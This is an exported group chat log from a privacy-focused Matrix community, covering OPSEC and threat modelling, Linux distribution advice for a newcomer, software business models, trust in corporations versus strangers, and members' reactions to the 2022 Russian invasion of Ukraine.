25.11.2021, 09:25:23 - suspiciousactions: yeah i feel you. like: you can be anonymous against your adversary but not anybody else and you are anonymous.
25.11.2021, 09:25:49 - hv: It's easier if the nails are small ;) (low bandwidth overhead like IRC)
25.11.2021, 09:26:06 - suspiciousactions: ppl arguing that way usually do not know about OPSEC or how to threat model n stuff i think.
25.11.2021, 09:26:30 - hv: Or they look at a tool as if the tool is to be analyzed in isolation

25.11.2021, 09:29:05 - suspiciousactions: agree
25.11.2021, 09:29:15 - hv: The Web is very complex, so exposing yourself to it should be minimized if it's critical
25.11.2021, 09:29:27 - suspiciousactions: but it is unrealistic as getting information out of them interwebbz is just too effective

Tor deals with pretty much any of this usually.

6.12.2021, 05:59:50 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): `disc1.iso`
6.12.2021, 05:59:58 - KennyWalther(🕊️Anonypla): Thx xD 
6.12.2021, 06:00:03 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Or if you're using a USB, use `memstick.img`
6.12.2021, 06:00:29 - KennyWalther(🕊️Anonypla): I wanna first put it on a vm so no usb neaded for now 
6.12.2021, 06:01:01 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "Or if you're using a USB, use `m..."> So when i will install it on my machine i need to put this img,ok 
6.12.2021, 06:01:24 - KennyWalther(🕊️Anonypla): Btw you dont have sleep ? Kina early :)
6.12.2021, 06:01:53 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Also, since X11 can be a security risk you'll wanna run Wayland on it
6.12.2021, 06:02:07 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): By default you'll have no GUI. You need to install one manually
6.12.2021, 06:02:52 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): If you're not ready to use a tiling window manager, maybe just use Fedora for the time being, until you can get used to running `i3` in a VM
6.12.2021, 06:03:31 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): See https://euroquis.nl//freebsd/2021/03/16/wayland for a guide on installing Wayland on HardenedBSD

6.12.2021, 06:05:11 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Ok, you don't know what a GUI is... Maybe HardenedBSD isn't the right OS for you
6.12.2021, 06:05:15 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "See https://euroquis.nl//freebsd..."> Thx
6.12.2021, 06:05:45 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): You're on Ubuntu rn, so let's take this slow. Try installing Fedora on your system
6.12.2021, 06:05:52 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "Ok, you don't know what a GUI is..."> :)) maybe 
6.12.2021, 06:06:14 - KennyWalther(🕊️Anonypla): Btw HBSD its ok with nvidia ? 
6.12.2021, 06:06:37 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): <@narktor:matrix.org "Btw HBSD its ok with nvidia ? "> You know what, let's stick with Fedora for now
6.12.2021, 06:06:44 - KennyWalther(🕊️Anonypla): Or need to do crazy stuff to make it work with an nvidia card 
6.12.2021, 06:07:00 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "You know what, let's stick with ..."> So doest stick well with nvidia ?:))
6.12.2021, 06:07:36 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): I do believe Fedora works with Nvidia, although that's only what I've heard
6.12.2021, 06:07:54 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): I've not tested it myself
6.12.2021, 06:08:13 - KennyWalther(🕊️Anonypla): Hmm 
6.12.2021, 06:08:22 - KennyWalther(🕊️Anonypla): I will search about it 
6.12.2021, 06:08:39 - KennyWalther(🕊️Anonypla): Hope i will not brake fedora 100times like ubuntu :)))
6.12.2021, 06:08:45 - KennyWalther(🕊️Anonypla): Broke*
6.12.2021, 06:08:48 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): If you decide not to run Fedora, maybe try Peppermint
6.12.2021, 06:09:10 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Peppermint is a nice OS that I know for a fact will run well on Nvidia
6.12.2021, 06:09:33 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "If you decide not to run Fedora,..."> I kinda like fedore its a good distro from what i heared ,only good things never infirnet about it 
6.12.2021, 06:09:38 - KennyWalther(🕊️Anonypla): Maybe i will try it 
6.12.2021, 06:10:04 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Fedora is a good choice. Your security will be improved significantly simply by having it installed
6.12.2021, 06:10:09 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "Peppermint is a nice OS that I k..."> Nah bot a fan of distroes with mint at finale

6.12.2021, 06:11:15 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): In fact, it has nothing to do with Mint
6.12.2021, 06:11:25 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Mint is an entirely separate distro
6.12.2021, 06:12:53 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "In fact, it has nothing to do wi..."> Hmm interesting 
6.12.2021, 06:13:01 - KennyWalther(🕊️Anonypla): Well o searched a video on yt about it 
6.12.2021, 06:13:58 - KennyWalther(🕊️Anonypla): Look nice user friendlh set-ul and windows like interface so for someone that used only windows like me will be relatively easy :)) 
6.12.2021, 06:14:00 - KennyWalther(🕊️Anonypla): But idk 
6.12.2021, 06:14:09 - KennyWalther(🕊️Anonypla): Still not a fan of it 
6.12.2021, 06:14:24 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): C'mon, it's basically an easier version of Ubuntu
6.12.2021, 06:14:41 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): You're already on Ubuntu so the transition will be super easy
6.12.2021, 06:15:17 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): And it'll run better because the OS is lighter
6.12.2021, 06:15:27 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Your hardware will thank you
6.12.2021, 06:16:30 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "Your hardware will thank you"> My hardware yes ,me trying to learm much as i can linux ,nope :) will be a change to use it so i'm forced to learn yk xD 
6.12.2021, 06:16:46 - KennyWalther(🕊️Anonypla): I switched to linux 3 months ago i think 
6.12.2021, 06:17:01 - KennyWalther(🕊️Anonypla): How much linux do you think i learned from pop os and ubuntu ? 
6.12.2021, 06:17:06 - KennyWalther(🕊️Anonypla): xD 
6.12.2021, 06:17:11 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): 🤷
6.12.2021, 06:17:21 - KennyWalther(🕊️Anonypla): And i need to find some things to read about linux too 
6.12.2021, 06:17:31 - KennyWalther(🕊️Anonypla): <@memorysafetybelike:envs.net "🤷"> Not much xD 
6.12.2021, 06:18:03 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): Well I'm going to sleep pretty soon, so whatever you decide, you're gonna have to decide without my help
6.12.2021, 06:18:20 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): I'm gonna be catchin' zzzzzzzzZs
6.12.2021, 06:19:02 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): You can use Fedora
6.12.2021, 06:19:06 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): You can use Peppermint
6.12.2021, 06:19:12 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): You can stick with Ubuntu

20.12.2021, 01:22:13 - SamLeh: If I would have a lot of extra time and energy I would write a Briar Connector bot, which would allow initiating creating Briar sessions via Briar alone. 

But I'll hit previous projects which need my attention first.

Making Briar to work like most of other messengers.

Just like there are Slack invite bots.

In this case the someone you know, would be automated bot. Which would trigger the introduction. Let's say your key is A and mine is B. I want to chat with you. Now I can tell the bot that I wan to talk with A and it'll introduce me to you. That's currently one of biggest problems with because you can't initiate new chats with someone without the key exchange.

1.1.2022, 23:54:59 - hv: just goes to show how many bits of information people reveal- you unintentionally gave someone data about *where* your attack surface is
1.1.2022, 23:55:22 - hv: if someone took the effort of compromising them just for you

1.1.2022, 23:56:02 - hv: more bits worth of identity over time just lowers the cost of deanonymization

3.1.2022, 19:01:23 - hv: What do you use now?
3.1.2022, 19:01:39 - KennyWalther(🕊️Anonypla): Ubuntu
3.1.2022, 19:02:01 - KennyWalther(🕊️Anonypla): Works fine for me ,but i want to step up a bit yk 
3.1.2022, 19:02:56 - KennyWalther(🕊️Anonypla): As you all probably knows ubuntu did some shady stuff in the past and thats one of the reasons i want to step up to something elese 
3.1.2022, 19:05:11 - hv: They don't do it now I think. However, the Free Software community very much punishes anyone within that deviates, with this kind of peer to peer 'reputation perpetuation'
3.1.2022, 19:05:15 - hv: It's interesting to obesrve
3.1.2022, 19:05:59 - hv: It's like a residual backlash to something that isn't currently happening, as if to ensure it does not happen again
3.1.2022, 19:06:42 - hv changed their profile picture
3.1.2022, 19:09:03 - KennyWalther(🕊️Anonypla): Well i agree in a specific part with that but that can lead to some toxicity around but at least its good that they observate and try to ensure it dosnt happen again 
3.1.2022, 19:09:30 - KennyWalther(🕊️Anonypla): And yeah from what i knoe they dont do it know ,if i'm wrong please correct me guys 
3.1.2022, 19:09:33 - KennyWalther(🕊️Anonypla): xD
3.1.2022, 19:09:55 - hv: RedHat also proves that you can sell libre software and the things surrounding it
3.1.2022, 19:10:37 - hv: It's not like being proprietary stops people from cracking software
3.1.2022, 19:10:49 - hv: Certainly never stopped a single person who torrented photoshop
3.1.2022, 19:12:04 - KennyWalther(🕊️Anonypla): Hmm lets not talk about cracking softwares and other things xD
3.1.2022, 19:12:43 - KennyWalther(🕊️Anonypla): Btw what do you think guys about 
3.1.2022, 19:12:47 - KennyWalther(🕊️Anonypla): HBSD ?
3.1.2022, 19:13:22 - KennyWalther(🕊️Anonypla): From what i heared (didnt informed specifically) they kinda improved a lot these days 
3.1.2022, 19:15:25 - emulationdepression: <@narktor:matrix.org "HBSD ?"> hardened bsd?
3.1.2022, 19:15:40 - hv: <@narktor:matrix.org "Hmm lets not talk about cracking..."> No, it's useful to the problem here
3.1.2022, 19:16:06 - KennyWalther(🕊️Anonypla): <@emulationdepression:matrix.org "hardened bsd?"> Yes 
3.1.2022, 19:16:38 - hv: Because it's very possible to crack software running restrictions and things like DRM, and trivial for the crackers to distribute those versions, those mechanisms don't actually stop pirating at all
3.1.2022, 19:16:59 - hv: So you could probably sell a free software program in the same way you sell proprietary software
3.1.2022, 19:17:27 - hv: Or even just an open source one
3.1.2022, 19:17:41 - emulationdepression: <@narktor:matrix.org "Yes "> ive read that it just adds a bunch of security features on a base os (freebsd) which isnt as secure as openbsd without modifications
3.1.2022, 19:18:10 - KennyWalther(🕊️Anonypla): <@interface:halogen.city "Or even just an open source one"> Yeah ik you can sell open source too ,was a privacy and security app i dont remeber the name and works well for them 
3.1.2022, 19:18:23 - emulationdepression: but still seems like a cool project, though im looking for something like it but for openbsd
3.1.2022, 19:18:39 - KennyWalther(🕊️Anonypla): But i think they(ubuntu staff) thinked that will not work and tryed the way that works for sure yk ?
3.1.2022, 19:18:47 - hv: All you do is put it for money on some app store or put a 'BUY' option on your website and they would buy it
3.1.2022, 19:18:55 - hv: Yes it wouldn't work for ubuntu
3.1.2022, 19:19:21 - hv: It's definitely a possible strategy with an OS

3.1.2022, 19:21:21 - hv: > Red Hat operates on a business model based on open-source software, development within a community, professional quality assurance, and subscription-based customer support. They produce open-source code so that more programmers can make adaptations and improvements.

3.1.2022, 19:24:06 - hv: Of course the development of fully FOSS projects like Linux itself, Ubuntu/Debian/Arch and more is cool as it is

3.1.2022, 19:25:42 - KennyWalther(🕊️Anonypla): xD
3.1.2022, 19:27:44 - hv: Well we could be living in a world where almost all software/firmware is proprietary, one with fewer open standards, and one without public disclosure of vulnerabilities

4.1.2022, 18:46:22 - sn0w(🕊️Anonypla): but then again the UK would have RARE shootings since guns are rare

1.2.2022, 19:14:21 - @anonypla:anonymousplanet.org: NATO is only a defensive pact

1.2.2022, 19:39:04 - @anonypla:anonymousplanet.org: Russia will never ever attack a NATO member country
1.2.2022, 19:39:07 - @anonypla:anonymousplanet.org: that would be suicide

1.2.2022, 19:42:59 - @anonypla:anonymousplanet.org: almost 30 countries ... and among those ... at least 3 have nuclear weapons/submarines/ICBMs
1.2.2022, 19:43:06 - @anonypla:anonymousplanet.org: NATO is not to be fucked with
1.2.2022, 19:43:13 - @anonypla:anonymousplanet.org: they have nukes

17.2.2022, 22:14:41 - suspiciousactions: without context to this i am pretty much clueless on what is meant.
17.2.2022, 22:14:50 - suspiciousactions: like "you are being obvious".
17.2.2022, 22:15:06 - suspiciousactions: is pretty non obvious to me.
17.2.2022, 22:17:48 - suspiciousactions: > The whole point of understanding the world is to miss a few details. It's way easier when everything makes sense

i have a different opinion. If additional (true) information does lead to "stuff making less sense", the model is flawed and needs to be adjusted. perfecting the model by challenging its capability to deliver reliable predictions against aditional information is the road to understanding the world.
17.2.2022, 22:19:53 - suspiciousactions: So sticking with an easy model by dismissing details that cannot be explained with it seems like the easy way, not the *right* one to me.
17.2.2022, 22:40:34 - neo_sodom(🕊Anonypla): Unfortunately, the world is not a program or model, since everything you perceive is processed by you, the subconsciously judgmental subject. What might look like a model for you, looks like a conspiracy theory to someone else and the other way around. With my claim above, I alluded to the fact that a model is easier when denying its complexity. This world-view is not helpful for the progress of society but great for the people that don't want to think outside of the box. 

Yet, you did not ask the right question but even the wrong person if you wish to find an answer.
17.2.2022, 22:42:43 - neo_sodom(🕊Anonypla): But you will find out for yourself. You have a lot of time
17.2.2022, 23:12:35 - suspiciousactions: The world works within the boundaries of rules. Gravity pulls apples to the ground, so one can create a model of how that works and predict falling objects. One will find that more complexity going on when exploring the boundaries of this model, that everything is accelerated with 9.81m²/s to the earth. So you adjust your model for specific scenarios like high altitudes to match the observations. You learn about gravitational constants and when exploring further edge cases about the space-time-continuum. For most practical use cases you don't need to take into account that there is special relativity for predicting trajectories of apples. The predictive error is quite small with such an easy model, but knowing about it is essential for understanding how the world works.

Complex systems like singular humans, government entities or whole societies are not bound by such precisely definitive rules but you can observe patterns in their behavior. Everybody has these models consciously or not.  I don't need to know the whole complexity of a human/government/other entity to make basic predictions on their behavior.
 
The classification of conspiracy theories is quite easy: If it the model does not offer predictive capability, is not falsifiable or cannot be proofen true with any means, chances are high that it is of  conspiratorial kind. It is pseudoscience. Also there are some common patterns in most conspiracy theories that help as an heuristic.

But without knowing the theory itself one can't classify it.

For me what snow wrote just did not make sense in that context, so i asked for context.
17.2.2022, 23:20:42 - suspiciousactions: so in short: actively dismissing details often is fine and the best way for good predictions, but to form a more correct model, one has to critically asses the model against those details, where it does not match the observation to refine it.

18.2.2022, 11:18:54 - suspiciousactions: Russian foreign minister asks the west press to release their schedule for the next year on when russia will invade Ukraine. She wants to plan her hollidays
https://www.theguardian.com/world/2022/feb/16/russians-ridicule-western-media-on-day-of-no-invasion

> The Russian foreign ministry spokesperson Maria Zakharova, who enjoys prodding foreign media, wrote a “request to the mass disinformation outlets of the USA and Britain – Bloomberg, the New York Times, the Sun etc – announce the schedule of our ‘invasions’ for the coming year. I’d like to plan my vacation”.

xD 
18.2.2022, 11:30:25 - toor: lol
18.2.2022, 11:31:40 - toor: To be honest, this is really making western media look a bit ridiculous. Maybe that's part of the plan
18.2.2022, 11:31:54 - suspiciousactions: it is.
18.2.2022, 11:37:36 - suspiciousactions: putins goal: don't want ukraine to get into nato.
USA goal: want's to delay North Stream 2 until winter is over.

You cannot join NATO if you are in an conflict right now, so putin simulated a conflict. Win. NATO said they would not defend Ukrain.
USA knows that putin is bluffing. he could overtake the Ukrain, but he cannot stabilize it afterwards. So provoking him to destroy his bluff is the best option. Also this will delay opening of North Stream 2.

What we see right now is a dance of russia to ridicule the west intelligence community by provoking them to pump out more false "russia will invade tomorrow!11!!!" statemenets.

This is what is pretty much happening right now. nobody will invade anything, it is just a big theater. This is not just my opinion, but the opinion of the geostrategic consultants multiple countries including the us.
18.2.2022, 11:39:14 - toor: The olympics end on sunday. If something is actually going to happen I'm pretty sure it must happen in a week
18.2.2022, 11:39:36 - toor: Seems that now would be the perfect time to start the actual invasion
18.2.2022, 11:39:51 - toor: But we will see if anything actually happens
18.2.2022, 11:39:59 - suspiciousactions: as said: There is no net gain for putin to invade. he won't do it.
18.2.2022, 11:40:06 - suspiciousactions: why would should he?
18.2.2022, 11:40:24 - suspiciousactions: he got everything he had asked for: Ukrain not in the NATO, ridiculing the west. all is fine.
18.2.2022, 11:42:23 - toor: I'm not gonna pretend that I know what Putin is planning. It's impossible to tell what the real goal here is
18.2.2022, 11:43:34 - suspiciousactions: i think we can be pretty sure that his main goal is to preven a Cuba situation in front of his door. That would be Ukraine joining NATO. This is quite literally the same situation against russia as Cuba was against the US.
18.2.2022, 11:44:27 - suspiciousactions: also he **really** likes to ridicule the west, (and is doing right now with statements from its foreign minster) so i think this is also a pretty clear secondary goal.
18.2.2022, 11:46:42 - toor: I don't think that ukraine will be able to resist very long if Russia decides to attack with all its force
18.2.2022, 11:46:55 - suspiciousactions: yes it would not
18.2.2022, 11:47:00 - suspiciousactions: russia could take over
18.2.2022, 11:47:11 - suspiciousactions: BUT they do not have the money to stabilize it afterwards.
18.2.2022, 11:47:18 - toor: Russia has so much more firepower. Artillery, air force, cruise missiles and iskanders etc.
18.2.2022, 11:47:23 - suspiciousactions: it would be like Afghanistan.
18.2.2022, 11:47:41 - suspiciousactions: (ok maybe not as bad as Afghanistan, but i hope you get my point)
18.2.2022, 11:47:46 - toor: Depends on if the population is really willing to resist
18.2.2022, 11:47:55 - suspiciousactions: they are xD
18.2.2022, 11:48:06 - suspiciousactions: they are training resistant groupt right now.
18.2.2022, 11:48:45 - toor: It could be some pr stuff, we can't really know how many people are actually like that
18.2.2022, 11:49:09 - suspiciousactions: oh it certainly is also a PR stunt.
18.2.2022, 11:53:52 - suspiciousactions: how much PR it is i cannot tell. From my perspective it seems like the Ukrainians would be willing to covertly sabotage everything that Russia would do in their country. But of course i cannot tell for sure as pretty much everything you hear about the conflict is propaganda. Also there is no real point in going for the invasion. Putin only needs his strategic base in the crimea, not the whole country. Ukraine i part of his protective belt around Russia against the west. In the ideal case members of this belt are neutral, not russian itself.
18.2.2022, 12:02:39 - suspiciousactions: strategically invading would not make sense. this would lead to more members of his protective belt to joing the NATO and this is the main goal to not let happen.. So we will see, but i say nuffin will happen.

18.2.2022, 14:40:37 - neo_sodom(🕊Anonypla): Well yeah but it's just not the same, if you get what I mean. Buying merch does provide monetary help but also is a form of identification and representation which would lack if I just send her some Monero
18.2.2022, 14:41:27 - suspiciousactions: no i am proposing: go to a local store to print the shirts yourself and donate 10-20% of the cost to her or something for using her "brand".
18.2.2022, 14:42:22 - neo_sodom(🕊Anonypla): Hmm I see

24.2.2022, 20:08:33 - toasterbirb (Old): The funny thing is that Ukraine used to be a nuclear country, but they were promised to not be bullied if they gave them away. I think Russia was ironically one of those who made the promise
24.2.2022, 20:09:53 - @anonypla:anonymousplanet.org: I think this will only result in two things
24.2.2022, 20:10:11 - @anonypla:anonymousplanet.org: 1) It will give an excuse to China to "liberate" Taiwan
24.2.2022, 20:10:31 - @anonypla:anonymousplanet.org: 2. it will give an excuse to the US the "liberate" Venezuela
24.2.2022, 20:10:35 - toasterbirb (Old): Yea, China is definitely watching closely how the world reacts and how much can they get away with
24.2.2022, 20:13:04 - @anonypla:anonymousplanet.org: And if we're lucky ... we'll avoid WW3
24.2.2022, 20:13:12 - toasterbirb (Old): Also all this during covid. What if it starts spreading through the armies
24.2.2022, 20:13:26 - toasterbirb (Old): Would be quite funny if it wasn't the other country taking down the other army but rather covid
24.2.2022, 20:13:50 - toasterbirb (Old): I really hope Putin isn't stupid enough to start WW3
24.2.2022, 20:14:00 - toasterbirb (Old): Their propaganda machine is strong
24.2.2022, 20:14:27 - @anonypla:anonymousplanet.org: I don't think it's "meant" to start WW3
24.2.2022, 20:14:32 - toasterbirb (Old): I'm not really sure if I should be even speaking about these matters with this account. I read in my countrys subreddit that the russian "trolls" go after people for saying stuff against them
24.2.2022, 20:14:56 - @anonypla:anonymousplanet.org: I think it's meant to give global powers some "permissions" to do some "things" here and there
24.2.2022, 20:15:02 - toasterbirb (Old): They scour through social medias and they try to make people think that you are suicidal etc.
24.2.2022, 20:15:04 - toasterbirb (Old): its horrifying
24.2.2022, 20:15:36 - toasterbirb (Old): not that I have any social medias to go troll in, but still, I'm a bit worried

24.2.2022, 20:18:13 - toasterbirb (Old): AFAIK my country is seriously thinking about joining NATO currently
24.2.2022, 20:18:27 - toasterbirb (Old): They need a major support in the government though and probably from the citizens too
24.2.2022, 20:19:20 - toasterbirb (Old): Also even if they don't march their armies here, our economy is really dependent on Russia
24.2.2022, 20:19:27 - toasterbirb (Old): these times are not going to be fun
24.2.2022, 20:19:53 - toasterbirb (Old): When we put sanctions on the Russian economy, we are also whipping our own economy

25.2.2022, 10:18:04 - suspiciousactions: He will weaken his belt.

Tho there is another geopolitical dimension: Russia is a flat land with a sparse population. Their best defensive strategy in a case of land based attack is to hold their line near geological obstacles on the outside borders, and there are ~7 strategical "roads" into Russia. Ukraine being one of it, 5 are already secure/have many troops stationed at, if i remember correctly. So this might be just their next "defensive" preparation step, should they assume war in the near/middle future to be unavoidable.

Totally agree and can relate with the "weird learning curve" of linux from: "Urgh, that is different" to "Hey, that is pretty cool" to "Shit but i really need this one Application" to "This would never be possible with windows" to "You guys run just one computer on your computer?"

27.2.2022, 21:17:50 - hv: Regarding https://matrix.to/#/!FQhDNwbesggyCBaAbm:tchncs.de/$H9pG6HakXqrPgaTuWTkq4GhysOdKHdqZQ0_9IdIGDP0?via=anonymousplanet.org&via=matrix.org&via=tchncs.de

Let's say you have a button which, if held down and released after 29-31 seconds, will cause you to have a heart attack and die.
You then approach a stranger and tell them about this button (let's assume they believe it works), and for the next year you tell them things about what you have said/done in the past, are saying/doing, or will say/do, so that they kind of have an idea of 'who' or 'what' you are. 

1) Do you think that if you pick an arbitrary stranger on the street, that even after a year they will choose to kill you for actions you may choose to take, even if they are problematic?

2) Do you think that, if instead of a stranger, we pick a faceless, publicly traded international megacorporation that must bend to the whims of hundreds of countries and corporate partners/advertisers, you will still find yourself alive after 1 year after having, say, offended one of those entities?
27.2.2022, 21:18:02 - hv: neat thought experiment

27.2.2022, 21:23:20 - neo_sodom(🕊Anonypla): Is the person defined as "you" me as me in neo_sodom or just a random person?
27.2.2022, 21:26:12 - hv: Some person
27.2.2022, 21:27:26 - hv: If one can say that 2) is more likely than 1), clearly it follows that corporations are even less trustworthy than the conventionally least-trustworthy class of people- random strangers picked off the street. 
27.2.2022, 21:27:35 - neo_sodom(🕊Anonypla): If so 
1. Depends if the person acts morally and if the stranger is a psychopath.
2. Depends on how much normalized this technology is.  Imagine Google doing that. It would probably mean a huge stock value loss, so no. It the ritual killing is something everyone enyojs, sure why not.
27.2.2022, 21:28:20 - hv: The killing could be any sort of harsh punishment- it's more of a symbol. Like life in prison, which is less ethical than execution
27.2.2022, 21:28:33 - hv: It basically means 'ruins your life', not a literal new murder technology 😂
27.2.2022, 21:30:10 - hv: There could be a chance that the stranger is an idiot (leaks the button) or an asshole (kills you for lulz). I think that the corporation would 'kill' just to increase profits, if not doing so would cause discomfort for powerful entities
27.2.2022, 21:33:21 - neo_sodom(🕊Anonypla): <@interface:halogen.city "There could be a chance that the..."> Correct. Same if the company would face backlash and loses profits. 
Companies are more predictable than humans in this scenario if they follow the strict profit orientation, right?
27.2.2022, 21:34:07 - hv: Yes, and allegedly sociopaths and such are more likely to be at the top than ordinary people as well
27.2.2022, 21:35:27 - hv: Another analogy would be, who is willing to snitch on a protester to an authoritarian police force- a stranger or a tech company?
27.2.2022, 21:35:57 - hv: That one is a harder call- let's say the stranger knows you will be irrevocably fucked, not just jailed for a bit
27.2.2022, 21:36:15 - hv: And so does the corp
27.2.2022, 21:36:48 - hv: Maybe it depends on morality, or whether the stranger agrees with the protest?
27.2.2022, 21:37:27 - neo_sodom(🕊Anonypla): It's hard to find an answer to the original question if you don't know the culture/society. Everything should boil down to "human level of moral and compassion" vs. "what is more profitable for the corporation"
27.2.2022, 21:38:04 - hv: In some cases, you have say, Apple allegedly refusing to decrypt a phone. But I wonder if Apple just knew that the short password the person used would let the FBI decrypt it anyway?
27.2.2022, 21:38:28 - hv: In that case, if they were not aware of some side-channel or weakness, then they actually tried to defend someone
27.2.2022, 21:39:08 - hv: Which kind of contradicts my point. But there are countless other examples of the opposite happening, quietly
27.2.2022, 21:40:43 - KennyWalther(🕊️Anonypla): UwU you guys are interesting xD 
27.2.2022, 21:41:13 - neo_sodom(🕊Anonypla): Apple playing the hero is good for their privacy image unless the dude was actually a peadophile/terrorist (works all the time)
27.2.2022, 21:41:57 - KennyWalther(🕊️Anonypla): <@neo_sodom:matrix.org "Apple playing the hero is good f..."> apple never was a hero xD from my pov , in terms of privacy they're still not worthy 
27.2.2022, 21:42:23 - neo_sodom(🕊Anonypla): That's right but they pretend to be
27.2.2022, 21:42:43 - hv: If the 'button' is instead 'something potentially legally incriminating' I wonder if the random person is the one with a higher probability of granting you mercy than the corporation
27.2.2022, 21:42:55 - KennyWalther(🕊️Anonypla): <@neo_sodom:matrix.org "Apple playing the hero is good f..."> well there are many methodes to catch the bad guy, apple got the "easy" method to just back door they're phones and give the key to gov 
27.2.2022, 21:43:42 - hv: <@interface:halogen.city "If the 'button' is instead 'some..."> Because in that case, there is a chance that the stranger actually agrees with whatever you did, or has some neutral stance on principle. Whereas the corporation could sustain massive fines if it was known that they have this information and refuse to give it up.
27.2.2022, 21:44:07 - KennyWalther(🕊️Anonypla): <@interface:halogen.city "If the 'button' is instead 'some..."> well here we put more the problem about the morality of the people i personally believe that corporations in general have less morality bc they do everything its needed for them to be good ,not for the people 
27.2.2022, 21:45:32 - hv: I think that in this case, while both have a good chance to fuck you up, over all the dice may tend to roll better in the situation of the stranger rather than the corp. Which is funny since arbitrary strangers are, again, supposed to be the least-trustworthy social class
27.2.2022, 21:45:56 - KennyWalther(🕊️Anonypla): <@interface:halogen.city "I think that in this case, while..."> depends 
27.2.2022, 21:47:08 - hv: Of course, this is a **stranger** instead of someone you have turned into a **friend**. So we have worse odds, for the sake of seeing if corps really are less trustworthy than strangers
27.2.2022, 21:48:24 - KennyWalther(🕊️Anonypla): again , in a real life scenario dont even matter if its a friend or literally any guy you pick up from the street , here depends on you ability to analyze and make the right choose 
27.2.2022, 21:50:03 - KennyWalther(🕊️Anonypla): "you dance on how they sing " rules , situation , timing everything its counts so in an imaginary exervise you basicly cant find the right aswer to a real life situation xD but if you choose the corp you can be in peace mind with few things 
27.2.2022, 21:50:32 - KennyWalther(🕊️Anonypla): exercise*
27.2.2022, 21:50:06 - hv: <@neo_sodom:matrix.org "Apple playing the hero is good f..."> But this is a good point too. In the case of less morally righteous accusations, like this, maybe the stranger is more likely to cross you, since the corporation might be able to get themselves good PR
27.2.2022, 21:51:38 - KennyWalther(🕊️Anonypla): sorry for the mistakes i made in writing xD ups xD
27.2.2022, 21:51:21 - hv: There is the chance that the stranger is intelligent enough to weigh the situation out in a neutral manner though, whereas the corp depends on what most of the people in charge think on aggregate, and by proxy whatever folly that the **majority** of people are susceptible to, + the influence of **capital**
27.2.2022, 21:57:09 - KennyWalther(🕊️Anonypla): UwU you guys for sure type a lot 
27.2.2022, 21:53:55 - hv: In every case, trusting the stranger seems like rolling fewer, more favorable dice than trusting the corporation. Even if the dice are assumed to be the same, to trust the corporation seems to amount to rolling more dice than are rolled on the stranger.
27.2.2022, 21:56:44 - hv: Conjecture: There are more variables involved in trusting a global megacorporation than a stranger, therefore they are more difficult to trust than even the least trustworthy class of people- strangers.

27.2.2022, 22:42:01 - suspiciousactions: regarding your argument above: i don't think you have to go all in with "death". Give a stranger and a corpo your information. At least one of those entities only reason for existing is to make as much cash as possible. Also one of those entities has the agency to abuse the information and monetize them much better than the other. Now we can try to figure out who is who in this game.
27.2.2022, 22:42:52 - suspiciousactions: case closed imo. i trust every random stranger more with my data then a corpo that makes money selling it. obvsly lol
27.2.2022, 22:44:40 - suspiciousactions: simple real life scenario: Tell a strange that you like volvo. He will most likely shrug. No real implication for anything. Tell google you like volvo and see ads for cars the next weeks.

28.2.2022, 16:39:19 - suspiciousactions: honestly: i do not know. it claims to be "Pegasus". It looks like tooling to create the pegasus rojan. But i cannot really confirm or debunk this. I think we have to wait for much smarter ppl to take a look at this.

28.2.2022, 18:40:21 - toasterbirb (Old): YouTube has a lot of videos about Russian missiles hitting civilian buildings at Ukraine and it wouldn't be that trivial to find out that there are already well over 100 civilian deaths

I'm going to transfer all my credentials, projects, and work to another girl who fortunately lives far away from this mess. She'll take over my project and everything. I tried to train her as best I could. She'll do. I will probably vanish soon but you'll never know. Unfortunately, here, my identity is known by the authorities and they know I'm not exactly pro-russian. So you might not see "me" again but you'll see my "friend" instead who I trust 100%.

4.3.2022, 08:08:01 - SamLeh: Yeah, I guess she's well funded. I would probably fleed somewhere. Especially in situation where you can leave the country. Portugal sounds nice in this situation.

4.3.2022, 08:10:07 - karlq: > just took advantage of the war
I'd say likely, it goes to that article the guide referenced about Death Note and bits of identifying info right. If you can add disinformation it only serves your purposes more. 
4.3.2022, 08:13:14 - neo_sodom(🕊Anonypla): https://www.gwern.net/Death-Note-Anonymity

This one?
4.3.2022, 08:13:27 - karlq: Yes
